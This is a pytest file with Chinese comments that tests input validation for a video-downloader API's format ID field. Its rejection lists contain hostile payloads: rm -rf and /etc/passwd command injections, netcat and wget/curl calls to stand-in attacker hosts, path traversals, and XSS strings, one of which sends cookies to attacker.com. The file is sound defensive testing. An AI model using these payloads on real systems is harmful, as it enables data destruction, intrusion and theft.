#!/usr/bin/env python3
"""
格式ID验证功能测试
测试前端和后端的格式ID验证机制
"""

import pytest
from fastapi.testclient import TestClient
from web.main import app, validate_format_id


class TestFormatIdValidation:
    """测试格式ID验证功能"""
    
    def test_valid_format_ids(self):
        """测试有效的格式ID"""
        valid_ids = [
            "mp4-1080p",
            "best",
            "worst",
            "bestvideo+bestaudio",
            "137+140",
            "22",
            "18",
            "mp3-conversion-best",
            "audio_128k",
            "video_1080p60"
        ]
        
        for format_id in valid_ids:
            is_valid, error = validate_format_id(format_id)
            assert is_valid, f"Format ID '{format_id}' should be valid, but got error: {error}"
    
    def test_invalid_format_ids(self):
        """测试无效的格式ID"""
        invalid_cases = [
            ("", "Empty format ID"),
            ("   ", "Whitespace only"),
            ("../etc/passwd", "Path traversal"),
            ("..\\windows\\system32", "Windows path traversal"),
            ("<script>alert('xss')</script>", "XSS injection"),
            ("format; rm -rf /", "Command injection"),
            ("format && cat /etc/passwd", "Command injection with &&"),
            ("format | cat secrets", "Command injection with pipe"),
            ("format`whoami`", "Command injection with backticks"),
            ("format$USER", "Variable expansion"),
            ("format\x00null", "Null byte injection"),
            ("format\ninjection", "Newline injection"),
            ("format\rinjection", "Carriage return injection"),
            ("format\"injection", "Quote injection"),
            ("format'injection", "Single quote injection"),
            ("format\\injection", "Backslash injection"),
            ("a" * 101, "Too long format ID"),
            ("format@domain.com", "Invalid character @"),
            ("format#hashtag", "Invalid character #"),
            ("format%20space", "Invalid character %"),
            ("format&param=value", "Invalid character &")
        ]
        
        for format_id, description in invalid_cases:
            is_valid, error = validate_format_id(format_id)
            assert not is_valid, f"Format ID '{format_id}' ({description}) should be invalid but was accepted"
            assert error, f"Should have error message for '{format_id}'"
    
    def test_edge_cases(self):
        """测试边界情况"""
        # 最大长度边界测试
        max_length_valid = "a" * 100
        is_valid, _ = validate_format_id(max_length_valid)
        assert is_valid, "100 character format ID should be valid"
        
        max_length_invalid = "a" * 101
        is_valid, _ = validate_format_id(max_length_invalid)
        assert not is_valid, "101 character format ID should be invalid"
        
        # 特殊有效字符测试
        special_valid_chars = "abc123_+-"
        is_valid, _ = validate_format_id(special_valid_chars)
        assert is_valid, "Format ID with valid special characters should be accepted"


class TestAPIValidation:
    """测试API端点的验证功能"""
    
    def setup_method(self):
        """设置测试客户端"""
        self.client = TestClient(app)
    
    def test_downloads_endpoint_invalid_format_id(self):
        """测试/downloads端点的格式ID验证"""
        invalid_request = {
            "url": "https://example.com/video",
            "download_type": "video",
            "format_id": "../etc/passwd",  # 恶意格式ID
            "resolution": "1080p"
        }
        
        response = self.client.post("/downloads", json=invalid_request)
        assert response.status_code == 400
        assert "Invalid format ID" in response.json()["detail"]
    
    def test_downloads_endpoint_invalid_download_type(self):
        """测试/downloads端点的下载类型验证"""
        invalid_request = {
            "url": "https://example.com/video",
            "download_type": "malicious_type",
            "format_id": "best",
            "resolution": "1080p"
        }
        
        response = self.client.post("/downloads", json=invalid_request)
        # Pydantic会在我们的验证之前拦截无效枚举值，返回422
        assert response.status_code == 422
        assert "download_type" in str(response.json())
    
    def test_downloads_endpoint_empty_url(self):
        """测试/downloads端点的URL验证"""
        invalid_request = {
            "url": "",
            "download_type": "video",
            "format_id": "best",
            "resolution": "1080p"
        }
        
        response = self.client.post("/downloads", json=invalid_request)
        assert response.status_code == 400
        assert "URL cannot be empty" in response.json()["detail"]
    
    def test_download_stream_endpoint_validation(self):
        """测试/download-stream端点的验证"""
        # 测试无效格式ID
        response = self.client.get("/download-stream", params={
            "url": "https://example.com/video",
            "download_type": "video",
            "format_id": "<script>alert('xss')</script>",
            "resolution": "1080p",
            "title": "test"
        })
        assert response.status_code == 400
        assert "Invalid format ID" in response.json()["detail"]
        
        # 测试无效下载类型
        response = self.client.get("/download-stream", params={
            "url": "https://example.com/video",
            "download_type": "malicious",
            "format_id": "best",
            "resolution": "1080p",
            "title": "test"
        })
        assert response.status_code == 400
        assert "Invalid download type" in response.json()["detail"]
        
        # 测试空URL
        response = self.client.get("/download-stream", params={
            "url": "",
            "download_type": "video",
            "format_id": "best",
            "resolution": "1080p",
            "title": "test"
        })
        assert response.status_code == 400
        assert "URL cannot be empty" in response.json()["detail"]


class TestSecurityValidation:
    """测试安全相关的验证"""
    
    def test_command_injection_prevention(self):
        """测试命令注入防护"""
        malicious_format_ids = [
            "; rm -rf /tmp/*",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`wget malicious.com/script.sh`",
            "$(/bin/bash)",
            "$(curl attacker.com)",
            "; wget http://evil.com/malware",
            "&& python -c 'import os; os.system(\"rm -rf /\")'"
        ]
        
        for malicious_id in malicious_format_ids:
            is_valid, error = validate_format_id(malicious_id)
            assert not is_valid, f"Malicious format ID should be rejected: {malicious_id}"
            assert "dangerous characters" in error.lower() or "invalid characters" in error.lower()
    
    def test_path_traversal_prevention(self):
        """测试路径遍历防护"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//etc//passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32"
        ]
        
        for path_attempt in path_traversal_attempts:
            is_valid, error = validate_format_id(path_attempt)
            assert not is_valid, f"Path traversal attempt should be rejected: {path_attempt}"
    
    def test_xss_prevention(self):
        """测试XSS防护"""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "\"><script>alert('xss')</script>",
            "<script>document.location='http://attacker.com/?'+document.cookie</script>"
        ]
        
        for xss_attempt in xss_attempts:
            is_valid, error = validate_format_id(xss_attempt)
            assert not is_valid, f"XSS attempt should be rejected: {xss_attempt}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])